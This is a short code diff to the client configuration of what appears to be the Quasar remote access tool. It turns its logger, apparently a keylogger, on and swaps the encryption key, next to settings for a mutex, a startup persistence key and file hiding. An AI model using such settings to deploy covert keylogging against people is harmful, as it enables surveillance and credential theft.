@@ -26,8 +26,8 @@ namespace Quasar.Client.Config
         public static string MUTEX = "123AKs82kA,ylAo2kAlUS2kYkala!";
         public static string STARTUPKEY = "Test key";
         public static bool HIDEFILE = false;
-        public static bool ENABLELOGGER = false;
-        public static string ENCRYPTIONKEY = "-.)4>[=u%5G3hY3&";
+        public static bool ENABLELOGGER = true;
+        public static string ENCRYPTIONKEY = "CFCD0759E20F29C399C9D4210BE614E4E020BEE8";
         public static string TAG = "DEBUG";
         public static string LOGDIRECTORYNAME = "Logs";
         public static string SERVERSIGNATURE = "";
